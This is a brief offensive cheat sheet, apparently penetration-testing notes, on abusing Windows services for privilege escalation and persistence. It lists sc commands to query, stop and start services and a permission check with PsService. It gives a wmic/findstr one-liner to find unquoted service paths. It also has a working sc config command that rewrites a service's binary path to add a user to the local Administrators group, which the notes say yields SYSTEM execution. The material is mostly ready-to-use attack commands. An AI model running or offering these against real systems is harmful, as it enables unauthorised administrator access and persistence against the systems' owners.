# Service Abuse

Goal: Modify services for persistence or privilege escalation.

---

# Query Service

sc query dns

---

# Stop Service

sc stop dns

---

# Start Service

sc start dns

---

# Modify Service Binary Path

sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

---

# Check Service Permissions

c:\Tools\PsService.exe security AppReadiness

---

# Unquoted Service Path Discovery

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

---

# Tactical Notes

- Requires write permission to service.
- Binary path modification leads to SYSTEM execution.
- Unquoted paths exploitable if writable directory exists.
